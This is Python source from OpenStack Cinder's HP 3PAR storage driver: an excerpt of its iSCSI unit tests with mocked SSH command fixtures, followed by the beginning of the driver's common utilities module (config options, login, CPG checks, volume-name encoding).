        self.setup_driver(self.setup_configuration())
        self.setup_fakes()

    def setup_fakes(self):
        super(TestHP3PARISCSIDriver, self).setup_fakes()

        self.stubs.Set(hpdriver.HP3PARISCSIDriver, ""_create_3par_iscsi_host"",
                       self.fake_create_3par_iscsi_host)

        #target_iqn = 'iqn.2000-05.com.3pardata:21810002ac00383d'
        self.properties = {'data':
                          {'target_discovered': True,
                           'target_iqn': self.TARGET_IQN,
                           'target_lun': 186,
                           'target_portal': '1.1.1.2:1234'},
                           'driver_volume_type': 'iscsi'}

    def tearDown(self):
        shutil.rmtree(self.tempdir)
        self._hosts = {}
        super(TestHP3PARISCSIDriver, self).tearDown()

    def setup_driver(self, configuration, set_up_fakes=True):
        self.driver = hpdriver.HP3PARISCSIDriver(configuration=configuration)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_create_client"",
                       self.fake_create_client)

        if set_up_fakes:
            self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_ports"",
                           self.fake_get_ports)

        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_set_connections"",
                       self.fake_set_connections)
        self.driver.do_setup(None)

    def fake_create_3par_iscsi_host(self, hostname, iscsi_iqn,
                                    domain, persona_id):
        host = {'FCPaths': [],
                'descriptors': None,
                'domain': domain,
                'iSCSIPaths': [{'driverVersion': None,
                                'firmwareVersion': None,
                                'hostSpeed': 0,
                                'ipAddr': '10.10.221.59',
                                'model': None,
                                'name': iscsi_iqn,
                                'portPos': {'cardPort': 1, 'node': 1,
                                            'slot': 8},
                                'vendor': None}],
                'id': 11,
                'name': hostname}
        self._hosts[hostname] = host
        return hostname

    def test_initialize_connection(self):
        self.flags(lock_path=self.tempdir)
        result = self.driver.initialize_connection(self.volume, self.connector)
        self.assertEqual(result['driver_volume_type'], 'iscsi')
        self.assertEqual(result['data']['target_iqn'],
                         self.properties['data']['target_iqn'])
        self.assertEqual(result['data']['target_portal'],
                         self.properties['data']['target_portal'])
        self.assertEqual(result['data']['target_discovered'],
                         self.properties['data']['target_discovered'])

        # we should have a host and a vlun now.
        host = self.fake_get_3par_host(self.FAKE_HOST)
        self.assertEquals(self.FAKE_HOST, host['name'])
        self.assertEquals(HP3PAR_DOMAIN, host['domain'])
        vlun = self.driver.common.client.getVLUN(self.VOLUME_3PAR_NAME)

        self.assertEquals(self.VOLUME_3PAR_NAME, vlun['volumeName'])
        self.assertEquals(self.FAKE_HOST, vlun['hostname'])

    def test_get_volume_stats(self):
        self.flags(lock_path=self.tempdir)

        def fake_safe_get(*args):
            return ""HP3PARFCDriver""

        self.stubs.Set(self.driver.configuration, 'safe_get', fake_safe_get)
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        self.assertEquals(stats['total_capacity_gb'], 'infinite')
        self.assertEquals(stats['free_capacity_gb'], 'infinite')

        #modify the CPG to have a limit
        old_cpg = self.driver.common.client.getCPG(HP3PAR_CPG)
        options = {'SDGrowth': {'limitMiB': 8192}}
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, options)

        const = 0.0009765625
        stats = self.driver.get_volume_stats(True)
        self.assertEquals(stats['storage_protocol'], 'iSCSI')
        total_capacity_gb = 8192 * const
        self.assertEquals(stats['total_capacity_gb'], total_capacity_gb)
        free_capacity_gb = int((8192 - old_cpg['UsrUsage']['usedMiB']) * const)
        self.assertEquals(stats['free_capacity_gb'], free_capacity_gb)
        self.driver.common.client.deleteCPG(HP3PAR_CPG)
        self.driver.common.client.createCPG(HP3PAR_CPG, {})

    def test_create_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                            ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])

        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_create_invalid_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack('no hosts listed'), ''])

        create_host_cmd = (['createhost', '-iscsi', '-persona', '1', '-domain',
                           ('OpenStack',), 'fakehost',
                            'iqn.1993-08.org.debian:01:222'])
        in_use_ret = pack('\r\nalready used by host fakehost.foo ')
        _run_ssh(create_host_cmd, False).AndReturn([in_use_ret, ''])

        show_3par_cmd = ['showhost', '-verbose', 'fakehost.foo']
        _run_ssh(show_3par_cmd, False).AndReturn([pack(ISCSI_3PAR_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)

        self.assertEquals(host['name'], 'fakehost.foo')

    def test_create_modify_host(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_cpg"",
                       self.fake_get_cpg)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""get_domain"",
                       self.fake_get_domain)
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_host_cmd = ['showhost', '-verbose', 'fakehost']
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_NO_HOST_RET), ''])

        create_host_cmd = ['createhost', '-iscsi', '-add', 'fakehost',
                           'iqn.1993-08.org.debian:01:222']
        _run_ssh(create_host_cmd, False).AndReturn([CLI_CR, ''])
        _run_ssh(show_host_cmd, False).AndReturn([pack(ISCSI_HOST_RET), ''])
        self.mox.ReplayAll()

        host = self.driver._create_host(self.volume, self.connector)
        self.assertEqual(host['name'], self.FAKE_HOST)

    def test_get_ports(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI),
                                                    ''])
        self.mox.ReplayAll()

        ports = self.driver.common.get_ports()
        self.assertEqual(ports['FC'][0], '20210002AC00383D')
        self.assertEqual(ports['iSCSI']['10.10.120.252']['nsp'], '0:8:2')

    def test_get_iscsi_ip_active(self):
        self.flags(lock_path=self.tempdir)

        #record set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN), ''])

        self.mox.ReplayAll()

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.253')

    def test_get_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        #record
        show_vlun_cmd = ['showvlun', '-a', '-host', 'fakehost']
        show_vlun_ret = 'no vluns listed\r\n'
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(show_vlun_ret), ''])
        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()

        config = self.setup_configuration()
        config.iscsi_ip_address = '10.10.10.10'
        config.hp3par_iscsi_ips = ['10.10.220.253', '10.10.220.252']
        self.setup_driver(config, set_up_fakes=False)

        ip = self.driver._get_iscsi_ip('fakehost')
        self.assertEqual(ip, '10.10.220.252')

    def test_invalid_iscsi_ip(self):
        self.flags(lock_path=self.tempdir)

        #record driver set up
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_port_cmd = ['showport']
        _run_ssh(show_port_cmd, False).AndReturn([pack(PORT_RET), ''])

        show_port_i_cmd = ['showport', '-iscsi']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(READY_ISCSI_PORT_RET),
                                                    ''])

        show_port_i_cmd = ['showport', '-iscsiname']
        _run_ssh(show_port_i_cmd, False).AndReturn([pack(SHOW_PORT_ISCSI), ''])

        config = self.setup_configuration()
        config.hp3par_iscsi_ips = ['10.10.220.250', '10.10.220.251']
        config.iscsi_ip_address = '10.10.10.10'
        self.mox.ReplayAll()

        # no valid ip addr should be configured.
        self.assertRaises(exception.InvalidInput,
                          self.setup_driver,
                          config,
                          set_up_fakes=False)

    def test_get_least_used_nsp(self):
        self.flags(lock_path=self.tempdir)

        #record
        self.clear_mox()
        _run_ssh = self.mox.CreateMock(hpdriver.hpcommon.HP3PARCommon._run_ssh)
        self.stubs.Set(hpdriver.hpcommon.HP3PARCommon, ""_run_ssh"", _run_ssh)

        show_vlun_cmd = ['showvlun', '-a', '-showcols', 'Port']
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])
        _run_ssh(show_vlun_cmd, False).AndReturn([pack(SHOW_VLUN_NONE), ''])

        self.mox.ReplayAll()
        # in use count                           11       12
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:8:1'])
        self.assertEqual(nsp, '0:2:1')

        # in use count                            11       10
        nsp = self.driver._get_least_used_nsp(['0:2:1', '1:2:1'])
        self.assertEqual(nsp, '1:2:1')

        # in use count                            0       10
        nsp = self.driver._get_least_used_nsp(['1:1:1', '1:2:1'])
        self.assertEqual(nsp, '1:1:1')


def pack(arg):
    header = '\r\n\r\n\r\n\r\n\r\n'
    footer = '\r\n\r\n\r\n'
    return header + arg + footer

FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

FC_SHOWHOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4C,0:2:1,n/a\r\n'
    '75,fakehost.foo,Generic,50014380242B8B4E,---,n/a\r\n'
    '75,fakehost.foo,Generic,1000843497F90711,0:2:1,n/a \r\n'
    '75,fakehost.foo,Generic,1000843497F90715,1:2:1,n/a\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

NO_FC_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost,Generic,iqn.1993-08.org.debian:01:222,---,10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_NO_HOST_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost,--,--\r\n'
    '\r\n'
    '---------- Host fakehost ----------\r\n'
    'Name       : fakehost\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

ISCSI_PORT_IDS_RET = (
    'N:S:P,-Node_WWN/IPAddr-,-----------Port_WWN/iSCSI_Name-----------\r\n'
    '0:2:1,28210002AC00383D,20210002AC00383D\r\n'
    '0:2:2,2FF70002AC00383D,20220002AC00383D\r\n'
    '0:2:3,2FF70002AC00383D,20230002AC00383D\r\n'
    '0:2:4,2FF70002AC00383D,20240002AC00383D\r\n'
    '0:5:1,2FF70002AC00383D,20510002AC00383D\r\n'
    '0:5:2,2FF70002AC00383D,20520002AC00383D\r\n'
    '0:5:3,2FF70002AC00383D,20530002AC00383D\r\n'
    '0:5:4,2FF70202AC00383D,20540202AC00383D\r\n'
    '0:6:4,2FF70002AC00383D,20640002AC00383D\r\n'
    '0:8:1,10.10.120.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,0.0.0.0,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:2:1,29210002AC00383D,21210002AC00383D\r\n'
    '1:2:2,2FF70002AC00383D,21220002AC00383D\r\n'
    '-----------------------------------------------------------------\r\n')

VOLUME_STATE_RET = (
    'Id,Name,Prov,Type,State,-Detailed_State-\r\n'
    '410,volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7,snp,vcopy,normal,'
    'normal\r\n'
    '-----------------------------------------------------------------\r\n')

PORT_RET = (
    'N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,Protocol,'
    'Label,Partner,FailoverState\r\n'
    '0:2:1,target,ready,28210002AC00383D,20210002AC00383D,host,FC,'
    '-,1:2:1,none\r\n'
    '0:2:2,initiator,loss_sync,2FF70002AC00383D,20220002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:3,initiator,loss_sync,2FF70002AC00383D,20230002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:4,initiator,loss_sync,2FF70002AC00383D,20240002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:1,initiator,loss_sync,2FF70002AC00383D,20510002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:2,initiator,loss_sync,2FF70002AC00383D,20520002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:3,initiator,loss_sync,2FF70002AC00383D,20530002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:4,initiator,ready,2FF70202AC00383D,20540202AC00383D,host,FC,'
    '-,1:5:4,active\r\n'
    '0:6:1,initiator,ready,2FF70002AC00383D,20610002AC00383D,disk,FC,'
    '-,-,-\r\n'
    '0:6:2,initiator,ready,2FF70002AC00383D,20620002AC00383D,disk,FC,'
    '-,-,-\r\n')

ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,82,1500,n/a,0,0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,182,1500,n/a,0,0.0.0.0,3205\r\n')

ISCSI_3PAR_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,iqn.1993-08.org.debian:01:222,---,'
    '10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

SHOW_PORT_ISCSI = (
    'N:S:P,IPAddr,---------------iSCSI_Name----------------\r\n'
    '0:8:1,1.1.1.2,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,10.10.120.252,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:8:1,10.10.220.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '1:8:2,10.10.220.252,iqn.2000-05.com.3pardata:21820002ac00383d\r\n'
    '-------------------------------------------------------------\r\n')

SHOW_VLUN = (
    'Lun,VVName,HostName,---------Host_WWN/iSCSI_Name----------,Port,Type,'
    'Status,ID\r\n'
    '0,a,fakehost,iqn.1993-08.org.debian:01:3a779e4abc22,1:8:1,matched set,'
    'active,0\r\n'
    '------------------------------------------------------------------------'
    '--------------\r\n')

SHOW_VLUN_NONE = (
    'Port\r\n0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n'
    '1:8:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n'
    '0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n1:2:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:8:1\r\n-----')

READY_ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,ready,10.10.120.252,255.255.224.0,0.0.0.0,82,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,ready,10.10.220.252,255.255.224.0,0.0.0.0,182,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '-------------------------------------------------------------------'
    '----------------------\r\n')
/n/n/ncinder/volume/drivers/san/hp/hp_3par_common.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver common utilities for HP 3PAR Storage array

The 3PAR drivers requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

The drivers uses both the REST service and the SSH
command line to correctly operate.  Since the
ssh credentials and the REST credentials can be different
we need to have settings for both.

The drivers requires the use of the san_ip, san_login,
san_password settings for ssh connections into the 3PAR
array.   It also requires the setting of
hp3par_api_url, hp3par_username, hp3par_password
for credentials to talk to the REST service on the 3PAR
array.
""""""

import ast
import base64
import json
import paramiko
import pprint
from random import randint
import re
import time
import uuid

from eventlet import greenthread
from hp3parclient import client
from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import volume_types


LOG = logging.getLogger(__name__)

hp3par_opts = [
    cfg.StrOpt('hp3par_api_url',
               default='',
               help=""3PAR WSAPI Server Url like ""
                    ""https://<3par ip>:8080/api/v1""),
    cfg.StrOpt('hp3par_username',
               default='',
               help=""3PAR Super user username""),
    cfg.StrOpt('hp3par_password',
               default='',
               help=""3PAR Super user password"",
               secret=True),
    #TODO(kmartin): Remove hp3par_domain during I release.
    cfg.StrOpt('hp3par_domain',
               default=None,
               help=""This option is DEPRECATED and no longer used. ""
                    ""The 3par domain name to use.""),
    cfg.StrOpt('hp3par_cpg',
               default=""OpenStack"",
               help=""The CPG to use for volume creation""),
    cfg.StrOpt('hp3par_cpg_snap',
               default="""",
               help=""The CPG to use for Snapshots for volumes. ""
                    ""If empty hp3par_cpg will be used""),
    cfg.StrOpt('hp3par_snapshot_retention',
               default="""",
               help=""The time in hours to retain a snapshot.  ""
                    ""You can't delete it before this expires.""),
    cfg.StrOpt('hp3par_snapshot_expiration',
               default="""",
               help=""The time in hours when a snapshot expires ""
                    "" and is deleted.  This must be larger than expiration""),
    cfg.BoolOpt('hp3par_debug',
                default=False,
                help=""Enable HTTP debugging to 3PAR""),
    cfg.ListOpt('hp3par_iscsi_ips',
                default=[],
                help=""List of target iSCSI addresses to use."")
]


CONF = cfg.CONF
CONF.register_opts(hp3par_opts)


class HP3PARCommon(object):

    stats = {}

    # Valid values for volume type extra specs
    # The first value in the list is the default value
    valid_prov_values = ['thin', 'full']
    valid_persona_values = ['1 - Generic',
                            '2 - Generic-ALUA',
                            '6 - Generic-legacy',
                            '7 - HPUX-legacy',
                            '8 - AIX-legacy',
                            '9 - EGENERA',
                            '10 - ONTAP-legacy',
                            '11 - VMware',
                            '12 - OpenVMS']
    hp_qos_keys = ['maxIOPS', 'maxBWS']
    hp3par_valid_keys = ['cpg', 'snap_cpg', 'provisioning', 'persona', 'vvs']

    def __init__(self, config):
        self.sshpool = None
        self.config = config
        self.hosts_naming_dict = dict()
        self.client = None
        if CONF.hp3par_domain is not None:
            LOG.deprecated(_(""hp3par_domain has been deprecated and ""
                             ""is no longer used. The domain is automatically ""
                             ""looked up based on the CPG.""))

    def check_flags(self, options, required_flags):
        for flag in required_flags:
            if not getattr(options, flag, None):
                raise exception.InvalidInput(reason=_('%s is not set') % flag)

    def _create_client(self):
        return client.HP3ParClient(self.config.hp3par_api_url)

    def client_login(self):
        try:
            LOG.debug(""Connecting to 3PAR"")
            self.client.login(self.config.hp3par_username,
                              self.config.hp3par_password)
        except hpexceptions.HTTPUnauthorized as ex:
            LOG.warning(""Failed to connect to 3PAR (%s) because %s"" %
                       (self.config.hp3par_api_url, str(ex)))
            msg = _(""Login to 3PAR array invalid"")
            raise exception.InvalidInput(reason=msg)

    def client_logout(self):
        self.client.logout()
        LOG.debug(""Disconnect from 3PAR"")

    def do_setup(self, context):
        self.client = self._create_client()
        if self.config.hp3par_debug:
            self.client.debug_rest(True)

        self.client_login()

        try:
            # make sure the default CPG exists
            self.validate_cpg(self.config.hp3par_cpg)
            self._set_connections()
        finally:
            self.client_logout()

    def validate_cpg(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound as ex:
            err = (_(""CPG (%s) doesn't exist on array"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

    def _set_connections(self):
        """"""Set the number of concurrent connections.

        The 3PAR WS API server has a limit of concurrent connections.
        This is setting the number to the highest allowed, 15 connections.
        """"""
        self._cli_run(['setwsapi', '-sru', 'high'])

    def get_domain(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound:
            err = (_(""Failed to get domain because CPG (%s) doesn't ""
                     ""exist on array."") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        domain = cpg['domain']
        if not domain:
            err = (_(""CPG (%s) must be in a domain"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)
        return domain

    def extend_volume(self, volume, new_size):
        volume_name = self._get_3par_vol_name(volume['id'])
        old_size = volume.size
        growth_size = int(new_size) - old_size
        LOG.debug(""Extending Volume %s from %s to %s, by %s GB."" %
                  (volume_name, old_size, new_size, growth_size))
        try:
            self._cli_run(['growvv', '-f', volume_name, '%dg' % growth_size])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error extending volume %s"") % volume)

    def _get_3par_vol_name(self, volume_id):
        """"""Get converted 3PAR volume name.

        Converts the openstack volume id from
        ecffc30f-98cb-4cf5-85ee-d7309cc17cd2
        to
        osv-7P.DD5jLTPWF7tcwnMF80g

        We convert the 128 bits of the uuid into a 24character long
        base64 encoded string to ensure we don't exceed the maximum
        allowed 31 character name limit on 3Par

        We strip the padding '=' and replace + with .
        and / with -
        """"""
        volume_name = self._encode_name(volume_id)
        return ""osv-%s"" % volume_name

    def _get_3par_snap_name(self, snapshot_id):
        snapshot_name = self._encode_name(snapshot_id)
        return ""oss-%s"" % snapshot_name

    def _get_3par_vvs_name(self, volume_id):
        vvs_name = self._encode_name(volume_id)
        return ""vvs-%s"" % vvs_name

    def _encode_name(self, name):
        uuid_str = name.replace(""-"", """")
        vol_uuid = uuid.UUID('urn:uuid:%s' % uuid_str)
        vol_encoded = base64.b64encode(vol_uuid.bytes)

        # 3par doesn't allow +, nor /
        vol_encoded = vol_encoded.replace('+', '.')
        vol_encoded = vol_encoded.replace('/', '-')
        # strip off the == as 3par doesn't like those.
        vol_encoded = vol_encoded.replace('=', '')
        return vol_encoded

    def _capacity_from_size(self, vol_size):

        # because 3PAR volume sizes are in
